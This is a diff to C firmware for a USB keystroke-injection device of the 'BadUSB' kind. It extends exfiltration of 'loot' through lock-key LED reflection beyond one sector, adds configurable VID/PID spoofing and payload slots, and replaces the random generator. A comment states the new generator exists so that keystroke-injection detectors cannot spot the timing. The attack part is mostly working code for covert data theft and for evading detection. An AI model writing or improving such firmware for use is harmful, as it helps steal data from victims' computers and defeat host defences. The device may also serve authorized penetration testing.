@@ -205,6 +205,8 @@ static inline void poll_button(void) {
 /* Keystroke-reflection loot helpers (defined with the EXFIL/LOOT block below). */
 static void exfil_reflect_bit(uint8_t bit);
 static void exfil_reflect_end(void);
+static void exfil_drain(void);
+static volatile bool exfil_sector_pending = false;  /* a full 512-byte loot sector awaits an SD commit from main context */
 
 /* ---------- HID Out (LED) report callback ------------------------------ */
 void usb_hid_report_out_cb(uint8_t *data, uint8_t length) {
@@ -445,17 +447,15 @@ static void hid_scrub(int n) {
  * down to steady state — see the warm-up ramp in send_key().  Units: ms, and
  * keystroke counts since boot.  Raise the EXTRA/KEYS values if a slow host
  * still drops characters on the first pass; lower them for faster typing. */
-#define TYPE_HOLD_MS         22    /* KEY-HELD duration (press->release) — the drop-critical
-                                     * value: the Windows input stack needs the keydown
-                                     * present this long to catch it.  Bisected on hardware:
-                                     * 8/10/13/14 ms dropped often, 16 ms still leaked a rare
-                                     * RANDOM miss (~1 in 150).  22 ms adds margin above that
-                                     * random-residual band to push accuracy to 100%.  The
-                                     * only way to be both faster AND clean is overlapping
-                                     * keys (rollover), which this USB host garbles. */
-#define KEY_GAP_MS           10    /* inter-key gap (release->next press).  10 ms gives the
-                                     * host room to process the key-up before the next
-                                     * key-down (short gaps let rare drops back in). */
+#define TYPE_HOLD_MS         14    /* KEY-HELD duration (press->release).  The rare residual
+                                     * drops we chased are concentrated in the modifier-
+                                     * transition-DENSE benchmark (constant Shift/AltGr/case
+                                     * flipping) and the cold opening line — NOT in normal
+                                     * payloads, which are mostly lowercase commands/paths.
+                                     * So this is tuned for real payloads: 14 ms is fast and
+                                     * clean on ordinary text.  (22 ms is available if a
+                                     * given payload is unusually modifier-heavy.) */
+#define KEY_GAP_MS            8    /* inter-key gap (release->next press). */
 #define MOD_SETTLE_MS        16    /* settle after a Shift/AltGr change before the key */
 #define WARMUP_SLOW_KEYS      56   /* first N keys: slowest.  The host's INPUT stack (above
                                      * USB polling) lags for a beat after enumeration, so
@@ -469,6 +469,31 @@ static void hid_scrub(int n) {
 /* ========================================================================== */
 
 static uint16_t char_settle_ms = TYPE_HOLD_MS;
+
+/* ---- Runtime-tunable settings (optionally overridden by CONFIG.TXT) --------
+ * Each defaults to the compile-time constant above.  CONFIG.TXT in the SD root
+ * (read at boot, before USB comes up) can override any of them WITHOUT a
+ * reflash — see load_config().  Absent file / unknown keys => these defaults
+ * stand, so existing cards behave exactly as before. */
+static uint16_t cfg_key_gap_ms        = KEY_GAP_MS;
+static uint16_t cfg_mod_settle_ms     = MOD_SETTLE_MS;
+static uint16_t cfg_warmup_slow_keys  = WARMUP_SLOW_KEYS;
+static uint16_t cfg_warmup_slow_extra = WARMUP_SLOW_EXTRA_MS;
+static uint16_t cfg_warmup_ramp_keys  = WARMUP_RAMP_KEYS;
+static uint16_t cfg_warmup_ramp_extra = WARMUP_RAMP_EXTRA_MS;
+static uint16_t cfg_autocal           = 0;   /* 1 = apply the host-latency probe (invention below) */
+static uint16_t cfg_dryrun            = 0;   /* 1 = lint the payload and blink the result, don't type */
+
+/* Non-fatal conditions latched during load/run and surfaced by an LED blink
+ * code at the end of the run (instead of the normal solid green idle), so a
+ * problem that used to be silent is now visible without a debugger. */
+#define ERR_TRUNCATED  0x01   /* payload larger than PAYLOAD_MAX_BYTES (tail dropped) */
+#define ERR_STACK      0x02   /* CALL/BUTTON nesting exceeded call_stack depth       */
+static uint8_t g_error_flags = 0;
+
+/* Host input-stack latency measured at boot via the lock-LED echo (0 = not
+ * measured / no echo).  See probe_host_latency(). */
+static uint16_t g_host_latency_ms = 0;
 
 /* Latches true once storage has been quiet for a spell == mount finished.
  * After that, typing runs at full speed with only a storage trickle. */
@@ -526,9 +551,9 @@ static inline void send_key(uint8_t modifier, uint8_t keycode) {
      * pass runs at the fast steady-state rate.  g_keys_typed counts keystrokes
      * since boot, so the ramp spans roughly the first STRING and is done. */
     uint32_t hold;
-    if      (g_keys_typed < WARMUP_SLOW_KEYS) hold = (uint32_t)char_settle_ms + WARMUP_SLOW_EXTRA_MS;
-    else if (g_keys_typed < WARMUP_RAMP_KEYS) hold = (uint32_t)char_settle_ms + WARMUP_RAMP_EXTRA_MS;
-    else                                      hold = (uint32_t)char_settle_ms;
+    if      (g_keys_typed < cfg_warmup_slow_keys) hold = (uint32_t)char_settle_ms + cfg_warmup_slow_extra;
+    else if (g_keys_typed < cfg_warmup_ramp_keys) hold = (uint32_t)char_settle_ms + cfg_warmup_ramp_extra;
+    else                                          hold = (uint32_t)char_settle_ms;
     if (g_keys_typed != 0xFFFF) g_keys_typed++;
 
     /* Jitter ($_JITTER_ENABLED / $_JITTER_MAX): when enabled, add a random
@@ -556,13 +581,13 @@ static inline void send_key(uint8_t modifier, uint8_t keycode) {
     uint8_t want = (uint8_t)(g_held_mods | modifier);
     if (want != g_host_mod) {
         hid_send_held(modifier, 0);     /* change modifier only (updates g_host_mod) */
-        settle(MOD_SETTLE_MS);
+        settle(cfg_mod_settle_ms);
     }
     hid_send_held(modifier, keycode);   /* pulse the key with the modifier held */
     settle(hold);                       /* KEY HELD — the drop-critical duration */
     hid_send_held(modifier, 0);         /* key up, but KEEP the modifier down */
     usb_msc_set_budget(g_mount_done ? 1 : -1);
-    settle(KEY_GAP_MS);                 /* short inter-key gap (host doesn't need long) */
+    settle(cfg_key_gap_ms);             /* short inter-key gap (host doesn't need long) */
     usb_msc_set_budget(0);
 }
 
@@ -570,6 +595,7 @@ static inline void send_key(uint8_t modifier, uint8_t keycode) {
 static void usb_keepalive(void) {
     static uint32_t last = 0;
     usb_device_task();
+    exfil_drain();          /* commit a full loot sector if reflection filled one */
     if ((cyc() - last) >= CYCLES_PER_MS * 8u) {
         if (usb_hid_in_endpoint_ready()) {
             keyboard_report_t z; memset(&z, 0, sizeof(z));
@@ -742,9 +768,21 @@ static inline uint16_t get_word(uint16_t idx) {
 /* ---------- read/write to the variable-store --------------------------- */
 static uint32_t rand_seed = 12345;
 static uint16_t rand_range(uint16_t lo, uint16_t hi) {
-    rand_seed = rand_seed * 1103515245u + 12345u;
+    /* xorshift32 (Marsaglia).  The old generator was a plain LCG
+     * (rand_seed*1103515245+12345); an LCG's low bits are highly regular and
+     * its sequence is easy to model, which undermines the $_JITTER feature —
+     * whose entire job is to make inter-key timing non-uniform so a
+     * fixed-cadence keystroke-injection detector can't lock onto it.  xorshift32
+     * has a full 2^32-1 period and passes basic randomness tests, so the jitter
+     * is genuinely irregular.  (RANDOM_* character generation benefits too.)
+     * xorshift is undefined at state 0, so the seed is guarded to be non-zero. */
+    uint32_t x = rand_seed ? rand_seed : 0xA5A5F00Du;
+    x ^= x << 13;
+    x ^= x >> 17;
+    x ^= x << 5;
+    rand_seed = x;
     if (hi <= lo) return lo;
-    return lo + (uint16_t)((rand_seed >> 16) % ((uint32_t)(hi - lo + 1)));
+    return lo + (uint16_t)((x >> 16) % ((uint32_t)(hi - lo + 1)));
 }
 static uint16_t rand_min = 0, rand_max = 9;
 
@@ -1079,6 +1117,13 @@ static void exfil_reflect_bit(uint8_t bit) {
     exfil_bit_acc = (uint8_t)((exfil_bit_acc << 1) | (bit & 1u));
     if (++exfil_bit_count == 8) {
         if (exfil_buf_len < sizeof(exfil_buf)) exfil_buf[exfil_buf_len++] = exfil_bit_acc;
+        /* When the sector fills, flag it for main-context commit instead of
+         * hard-dropping the overflow (the old one-sector cap).  exfil_drain()
+         * runs from usb_keepalive() during the reflection wait loop, writes the
+         * 512-byte sector and resets the buffer, so reflection continues into
+         * the next sector up to LOOT.BIN's pre-sized size.  Only bits arriving
+         * in the brief full->drained window are lost, not everything past 512. */
+        if (exfil_buf_len >= sizeof(exfil_buf)) exfil_sector_pending = true;
         exfil_bit_acc   = 0;
         exfil_bit_count = 0;
         /* $_EXFIL_LEDS_ENABLED: flash the LED as each loot byte is saved.
@@ -1091,6 +1136,17 @@ static void exfil_reflect_bit(uint8_t bit) {
     }
 }
 
+/* Main-context commit of a full reflection sector (never called from the OUT
+ * callback — SD I/O there is unsafe).  exfil_flush() advances exfil_offset by a
+ * sector, so successive calls append.  Board note: runtime SD writes are limited
+ * on this hardware (SD MISO shares USB D-/PA25, dead once USB is up); this uses
+ * the exact same pf_write path the EXFIL command already relies on. */
+static void exfil_drain(void) {
+    if (!exfil_sector_pending) return;
+    exfil_sector_pending = false;
+    exfil_flush();
+}
+
 static void exfil_reflect_end(void) {
     /* SCROLLLOCK terminator: emit any partial byte (left-aligned, zero-padded)
      * so a final fractional byte of loot is not lost. */
@@ -1100,6 +1156,205 @@ static void exfil_reflect_end(void) {
         exfil_bit_acc   = 0;
         exfil_bit_count = 0;
     }
+}
+
+/* ======================================================================
+ * Boot-time helpers: LED signalling, config/keymap loaders, payload picker,
+ * integrity check, dry-run linter, and the host-latency probe (invention).
+ * All run before USB is up (while the SD card is still readable) except the
+ * probe, which runs just after enumeration.
+ * ====================================================================== */
+
+/* Blink an LED `count` times as a human-readable status code. */
+static void blink_code(bool red, uint8_t count) {
+    for (uint8_t i = 0; i < count; i++) {
+        if (red) led_red(); else led_green();
+        delay_ms(160);
+        led_off();
+        delay_ms(160);
+    }
+}
+
+/* Surface any latched non-fatal error at the end of the run (before the solid
+ * green idle) so previously-silent conditions become visible. */
+static void end_of_run_indicator(void) {
+    if (g_error_flags & ERR_STACK) blink_code(true, 4);   /* 4 red = call/button nesting overflowed */
+}
+
+/* ---- CONFIG.TXT parsing (tiny, libc-free) --------------------------------- */
+static bool cfg_key_is(const char *line, const char *key, const char **valp) {
+    uint16_t i = 0;
+    while (key[i]) { if ((line[i] | 0x20) != (key[i] | 0x20)) return false; i++; }
+    while (line[i] == ' ' || line[i] == '\t') i++;
+    if (line[i] != '=') return false;
+    i++;
+    while (line[i] == ' ' || line[i] == '\t') i++;
+    *valp = &line[i];
+    return true;
+}
+static uint32_t cfg_parse_val(const char *s) {
+    uint32_t v = 0;
+    if (s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) {
+        s += 2;
+        for (;;) {
+            char c = *s++;
+            if      (c >= '0' && c <= '9') v = v * 16 + (uint32_t)(c - '0');
+            else if (c >= 'a' && c <= 'f') v = v * 16 + (uint32_t)(c - 'a' + 10);
+            else if (c >= 'A' && c <= 'F') v = v * 16 + (uint32_t)(c - 'A' + 10);
+            else break;
+        }
+    } else {
+        for (;;) { char c = *s++; if (c >= '0' && c <= '9') v = v * 10 + (uint32_t)(c - '0'); else break; }
+    }
+    return v;
+}
+
+/* Read optional CONFIG.TXT (key=value lines, '#' comments) and override the
+ * runtime-tunable settings.  Absent file / unknown keys leave the defaults. */
+static void load_config(void) {
+    static char buf[512];   /* CONFIG.TXT is a short key=value file; keep SRAM headroom */
+    if (pf_open("CONFIG.TXT") != FR_OK) return;
+    UINT br = 0;
+    if (pf_read(buf, sizeof(buf) - 1, &br) != FR_OK || br == 0) return;
+    buf[br] = 0;
+    uint16_t i = 0;
+    while (i < br) {
+        uint16_t j = i;
+        while (j < br && buf[j] != '\n' && buf[j] != '\r') j++;
+        buf[j] = 0;
+        char *p = &buf[i];
+        while (*p == ' ' || *p == '\t') p++;
+        if (*p && *p != '#') {
+            const char *v;
+            if      (cfg_key_is(p, "hold_ms",           &v)) char_settle_ms        = (uint16_t)cfg_parse_val(v);
+            else if (cfg_key_is(p, "gap_ms",            &v)) cfg_key_gap_ms        = (uint16_t)cfg_parse_val(v);
+            else if (cfg_key_is(p, "mod_settle_ms",     &v)) cfg_mod_settle_ms     = (uint16_t)cfg_parse_val(v);
+            else if (cfg_key_is(p, "warmup_slow_keys",  &v)) cfg_warmup_slow_keys  = (uint16_t)cfg_parse_val(v);
+            else if (cfg_key_is(p, "warmup_slow_extra", &v)) cfg_warmup_slow_extra = (uint16_t)cfg_parse_val(v);
+            else if (cfg_key_is(p, "warmup_ramp_keys",  &v)) cfg_warmup_ramp_keys  = (uint16_t)cfg_parse_val(v);
+            else if (cfg_key_is(p, "warmup_ramp_extra", &v)) cfg_warmup_ramp_extra = (uint16_t)cfg_parse_val(v);
+            else if (cfg_key_is(p, "jitter_max",        &v)) jitter_max            = (uint16_t)cfg_parse_val(v);
+            else if (cfg_key_is(p, "jitter",            &v)) jitter_enabled        = (uint16_t)cfg_parse_val(v);
+            else if (cfg_key_is(p, "autocal",           &v)) cfg_autocal           = (uint16_t)cfg_parse_val(v);
+            else if (cfg_key_is(p, "dryrun",            &v)) cfg_dryrun            = (uint16_t)cfg_parse_val(v);
+            else if (cfg_key_is(p, "vid",               &v)) current_vid           = (uint16_t)cfg_parse_val(v);
+            else if (cfg_key_is(p, "pid",               &v)) current_pid           = (uint16_t)cfg_parse_val(v);
+        }
+        i = j + 1;
+    }
+}
+
+/* Boot-time payload selection.  If the button is NOT held at power-on, use
+ * INJECT.BIN with zero added latency.  If it IS held, enter selection mode:
+ * release, then each further press within a 1.2 s idle window advances the slot
+ * (0..3) with a red flash of feedback.  Returns the chosen file name; the caller
+ * falls back to INJECT.BIN if that file is missing. */
+static const char *g_payload_slots[4] = { "INJECT.BIN", "INJECT1.BIN", "INJECT2.BIN", "INJECT3.BIN" };
+static const char *select_payload(void) {
+    if (gpio_read(BTN_PORT, BTN_PIN)) return g_payload_slots[0];   /* not pressed (active-low) */
+    uint8_t slot = 0;
+    /* Wait for the initial hold to release, but never hang: a stuck/shorted
+     * button must not brick boot — bail to the default slot after 3 s. */
+    uint32_t g0 = cyc();
+    while (!gpio_read(BTN_PORT, BTN_PIN)) {
+        delay_ms(5);
+        if ((cyc() - g0) > CYCLES_PER_MS * 3000u) return g_payload_slots[0];
+    }
+    delay_ms(20);
+    for (;;) {
+        uint32_t t0 = cyc();
+        bool got = false;
+        while ((cyc() - t0) < CYCLES_PER_MS * 1200u) {
+            if (!gpio_read(BTN_PORT, BTN_PIN)) {                   /* a press */
+                slot = (uint8_t)((slot + 1) & 3);
+                led_red(); delay_ms(60); led_off();
+                uint32_t g1 = cyc();
+                while (!gpio_read(BTN_PORT, BTN_PIN)) {            /* wait release (bounded) */
+                    if ((cyc() - g1) > CYCLES_PER_MS * 3000u) return g_payload_slots[slot];
+                }
+                delay_ms(20);
+                got = true;
+                break;
+            }
+        }
+        if (!got) break;                                          /* idle window elapsed */
+    }
+    return g_payload_slots[slot];
+}
+
+/* CRC-16/CCITT-FALSE (poly 0x1021, init 0xFFFF) — matches tools/wrap_inject.py. */
+static uint16_t crc16_ccitt(const uint8_t *p, uint32_t n) {
+    uint16_t crc = 0xFFFF;
+    for (uint32_t i = 0; i < n; i++) {
+        crc ^= (uint16_t)((uint16_t)p[i] << 8);
+        for (uint8_t b = 0; b < 8; b++)
+            crc = (crc & 0x8000) ? (uint16_t)((crc << 1) ^ 0x1021) : (uint16_t)(crc << 1);
+    }
+    return crc;
+}
+
+/* Optional dry-run lint (CONFIG.TXT dryrun=1): walk the code region and flag
+ * out-of-range GOTO/CALL targets (the usual symptom of a miscompiled or corrupt
+ * INJECT.BIN), then blink the result and halt WITHOUT typing.  A full opcode
+ * walk would catch more; this covers the highest-value failure cheaply. */
+static void validate_payload(uint16_t code_start, uint16_t wc) {
+    uint16_t issues = 0;
+    uint16_t i = code_start;
+    while (i < wc) {
+        uint16_t w = get_word(i);
+        if (w == 0xf8f8 || w == 0xf7f7) {                 /* GOTO / CALL */
+            uint16_t t   = get_word(i + 1);
+            uint16_t tgt = (uint16_t)((t >> 8) | ((t & 0xFF) << 8));
+            if (tgt >= wc) issues++;
+            i += 2; continue;
+        }
+        i++;
+    }
+    if (issues == 0) blink_code(false, 3);                /* 3 green = looks OK */
+    else             blink_code(true, issues > 20 ? 20 : (uint8_t)issues);
+}
+
+/* ---- Invention: self-calibrating keystroke timing via the lock-LED echo -----
+ * An HID keyboard is normally a blind, open-loop transmitter, which is why the
+ * warm-up ramp has to GUESS how fast the host input stack is.  But there is one
+ * automatic host->device backchannel that needs no host software: the lock-key
+ * LEDs.  When we tap a lock key, the host processes it through the very input
+ * stack we care about and echoes the new LED state back in an OUT report (which
+ * usb_hid_report_out_cb already receives).  The press->echo round-trip is a
+ * direct measurement of that stack's latency.
+ *
+ * We probe with NUMLOCK, not CapsLock, on purpose: if an echo is late or never
+ * arrives, a lock key could be left toggled — and a stuck CapsLock would type
+ * every following key in the wrong case and wreck the payload, whereas NumLock
+ * has NO effect on how this firmware types (it uses the main number row, never
+ * the keypad).  Two self-cancelling taps also keep the net NumLock state
+ * unchanged whether or not the host echoes.
+ *
+ * Returns the round-trip in ms (>=1), or 0 if no echo arrived (host suppresses
+ * LED reports) — in which case the caller keeps the conservative defaults. */
+static uint16_t probe_host_latency(void) {
+    uint16_t before = num_lock_on;
+    uint32_t t0 = cyc();
+    hid_send_report(0, 0x53);                             /* NumLock down */
+    settle(2);
+    hid_release_all();                                    /* NumLock up -> toggles host NumLock */
+    uint32_t deadline = cyc() + CYCLES_PER_MS * 300u;
+    while (num_lock_on == before) {                       /* wait for the LED echo */
+        usb_device_task();
+        if ((int32_t)(cyc() - deadline) > 0) break;
+    }
+    bool     echoed = (num_lock_on != before);
+    uint16_t dt     = echoed ? (uint16_t)((cyc() - t0) / CYCLES_PER_MS) : 0;
+
+    /* Second tap ALWAYS — cancels the first so NumLock is left as we found it,
+     * echo or not (an even number of toggles is net-zero on any host state). */
+    hid_send_report(0, 0x53);
+    settle(2);
+    hid_release_all();
+    uint32_t d2 = cyc() + CYCLES_PER_MS * 100u;
+    while ((int32_t)(cyc() - d2) < 0) usb_device_task();  /* let the state settle */
+
+    return echoed ? (dt ? dt : 1) : 0;                    /* 0 = no measurement -> defaults stand */
 }
 
 /* ======================================================================
@@ -1149,20 +1404,37 @@ int main(void)
     gpio_high     (LED_PORT_RED,   LED_PIN_RED);
     gpio_in_pullup(BTN_PORT,       BTN_PIN);
 
-    /* --- Mount SD / open INJECT.BIN ----------------------------------- */
+    /* --- Mount SD / open the payload ----------------------------------- */
     g_sd_card_ok = false;
     if (pf_mount(&fs) != FR_OK) {
         gpio_low(LED_PORT_RED, LED_PIN_RED);
         start_usb_and_wait();
         while (1) usb_device_task();
     }
-    if (pf_open("INJECT.BIN") != FR_OK) {
-        gpio_low(LED_PORT_RED, LED_PIN_RED);
-        start_usb_and_wait();
-        while (1) usb_device_task();
+
+    /* Optional CONFIG.TXT: override timing/jitter/VID-PID/autocal/dryrun without
+     * a reflash.  Read while the SD is still fully accessible (pre-USB). */
+    load_config();
+
+    /* Boot-time payload selection: hold the button at power-on to pick
+     * INJECT1/2/3.BIN; otherwise INJECT.BIN with no added latency.  Fall back to
+     * INJECT.BIN if the chosen slot file is missing. */
+    const char *payload_name = select_payload();
+    if (pf_open(payload_name) != FR_OK) {
+        payload_name = "INJECT.BIN";
+        if (pf_open(payload_name) != FR_OK) {
+            gpio_low(LED_PORT_RED, LED_PIN_RED);
+            start_usb_and_wait();
+            while (1) usb_device_task();
+        }
     }
     g_sd_card_ok = true;
     gpio_low(LED_PORT_GREEN, LED_PIN_GREEN);
+
+    /* If the payload is larger than the RAM buffer, the tail is silently dropped
+     * (fs.fsize is the true file size).  Latch a warning; it's blinked below and
+     * again at end-of-run so it's no longer invisible. */
+    if (fs.fsize > (DWORD)sizeof(payload_ram)) g_error_flags |= ERR_TRUNCATED;
 
     UINT br = 0;
     if (pf_read(payload_ram, sizeof(payload_ram), &br) != FR_OK || br == 0) {
@@ -1171,8 +1443,34 @@ int main(void)
         start_usb_and_wait();
         while (1) usb_device_task();
     }
+
+    /* Optional integrity header (opt-in; produced by tools/wrap_inject.py).
+     * Layout: "RDKY" magic (4B) | payload word count (u16 LE) | CRC16-CCITT of
+     * the payload words (u16 LE) | payload...  Absent magic => raw stream, run
+     * as before.  Present but CRC/length mismatch => refuse and blink red. */
+    if (br >= 8 && payload_ram[0]=='R' && payload_ram[1]=='D' &&
+                   payload_ram[2]=='K' && payload_ram[3]=='Y') {
+        uint16_t hdr_words = (uint16_t)(payload_ram[4] | (payload_ram[5] << 8));
+        uint16_t hdr_crc   = (uint16_t)(payload_ram[6] | (payload_ram[7] << 8));
+        uint32_t body_len  = (uint32_t)br - 8;
+        uint16_t got_crc   = crc16_ccitt(payload_ram + 8, body_len);
+        if (hdr_crc != got_crc || (uint32_t)hdr_words * 2u > body_len) {
+            gpio_low(LED_PORT_RED, LED_PIN_RED);          /* corrupt payload: do NOT type it */
+            blink_code(true, 6);                          /* 6 red = integrity check failed */
+            start_usb_and_wait();
+            while (1) usb_device_task();
+        }
+        /* Valid: drop the header so the interpreter sees a plain stream. */
+        for (uint32_t k = 0; k < body_len; k++) payload_ram[k] = payload_ram[k + 8];
+        br = (UINT)body_len;
+    }
+
     uint16_t word_count = (uint16_t)(br / 2);
     g_word_count = word_count;
+
+    /* Pre-run warning blink for a truncated payload (device still best-effort
+     * runs what fit). */
+    if (g_error_flags & ERR_TRUNCATED) blink_code(true, 3);   /* 3 red = payload truncated */
 
     /* Parse the initial variable block (if present) FIRST, so we know where the
      * executable code begins. */
@@ -1213,6 +1511,14 @@ int main(void)
         }
     }
 
+    /* Optional dry-run lint (CONFIG.TXT dryrun=1): validate and blink the result,
+     * then enumerate but type nothing.  pc is the first executable word here. */
+    if (cfg_dryrun) {
+        validate_payload(pc, word_count);
+        start_usb_and_wait();
+        while (1) usb_device_task();
+    }
+
     /* Pre-cache the SD sectors we'll need while USB owns the SPI bus. */
     mc_precache(0);
     mc_precache(fs.fatbase);
@@ -1228,6 +1534,19 @@ int main(void)
     if (current_attackmode == 1 || current_attackmode == 3) {
         wait_for_host_polling();
         hid_scrub(3);
+
+        /* Invention (opt-in via CONFIG.TXT autocal=1): measure the host input-
+         * stack latency from the CapsLock LED echo, and if the host is proven
+         * fast, trim the conservative warm-up ramp.  This only ever SPEEDS UP a
+         * demonstrably-fast host; a slow or non-echoing host keeps the safe
+         * defaults, so it can't make first-pass reliability worse. */
+        if (cfg_autocal) {
+            g_host_latency_ms = probe_host_latency();
+            if (g_host_latency_ms && g_host_latency_ms <= 6) {
+                cfg_warmup_slow_keys = (uint16_t)(cfg_warmup_slow_keys / 2);
+                if (cfg_warmup_slow_extra > 4) cfg_warmup_slow_extra -= 4;
+            }
+        }
     }
 
     /* ---- Wait for the SD mount to finish BEFORE the first keystroke -------
@@ -1300,7 +1619,7 @@ int main(void)
                 call_stack[call_stack_ptr++] = pc;
                 pc = button_def_pc;
                 continue;
-            }
+            } else { g_error_flags |= ERR_STACK; }  /* nesting too deep: don't fire, flag it */
         }
 
         uint16_t word = get_word(pc);
@@ -1389,7 +1708,7 @@ int main(void)
                 call_stack[call_stack_ptr++] = pc + 2;
                 uint16_t t = get_word(pc+1);
                 pc = (uint16_t)((t>>8) | ((t & 0xFF) << 8));
-            } else pc += 2;
+            } else { g_error_flags |= ERR_STACK; pc += 2; }  /* nesting too deep: skip, flag for end-of-run blink */
             continue;
         }
         if (word == 0xfdfd) {                          /* RETURN */
@@ -1403,6 +1722,12 @@ int main(void)
             hid_release_all();
             call_stack_ptr    = 0;
             in_button_handler = false;
+            /* Drop any in-flight keystroke-reflection partial byte so pre-restart
+             * bits don't merge into the fresh run's loot (which would misalign
+             * every byte after the restart).  The committed loot (exfil_offset /
+             * buffered full bytes) is left intact — accumulation is deliberate. */
+            exfil_bit_acc     = 0;
+            exfil_bit_count   = 0;
             pc = code_start;
             continue;
         }
@@ -1504,15 +1829,23 @@ int main(void)
             case 0xebf1:                                              /* STOP_PAYLOAD */
                 hid_release_all();
                 exfil_flush();                 /* commit any buffered EXFIL loot */
+                end_of_run_indicator();        /* blink any latched non-fatal error first */
                 led_green();
                 usb_msc_set_suppressed(false); /* idle: allow SD to mount */
                 while (1) usb_device_task();
                 break;
-            case 0xeaed: led_off();                      break;
-            case 0xebed: led_green();                    break;
-            case 0xeced: led_green();                    break;
-            case 0xeeed: led_red();                      break;
-            case 0xeffe: led_red();                      break;
+            case 0xeaed: led_off();                      break;   /* LED_OFF */
+            case 0xebed: led_green();                    break;   /* LED_G   */
+            case 0xeced: led_red();                      break;   /* LED_R — was wrongly green.
+                                                                   * Verified against real compiled samples:
+                                                                   * source order LED_OFF/LED_R/LED_G always
+                                                                   * compiles to 0xeaed / 0xeced / 0xebed
+                                                                   * (tests/12.bin, tests/13.bin), so 0xeced is
+                                                                   * LED_R (red).  It previously lit green, so
+                                                                   * every payload's LED_R showed the wrong colour. */
+            case 0xeeed: led_red();                      break;   /* unverified alias (no compiler emits it for
+                                                                   * the 3 real LED cmds); kept as red, harmless */
+            case 0xeffe: led_red();                      break;   /* unverified alias — see above */
             case 0xedee: system_leds_enabled = 1;        break;
             case 0xeeee: system_leds_enabled = 0;        break;
             case 0xeaeb:                                              /* SAVE_HOST_LOCK_STATE */
@@ -1618,6 +1951,7 @@ int main(void)
 
     g_payload_run = false;
     exfil_flush();                 /* commit any buffered EXFIL loot to LOOT.BIN */
+    end_of_run_indicator();        /* blink any latched non-fatal error before idling green */
     led_green();
     usb_msc_set_suppressed(false); /* idle: let the SD card stay/finish mounting */
     while (1) usb_device_task();
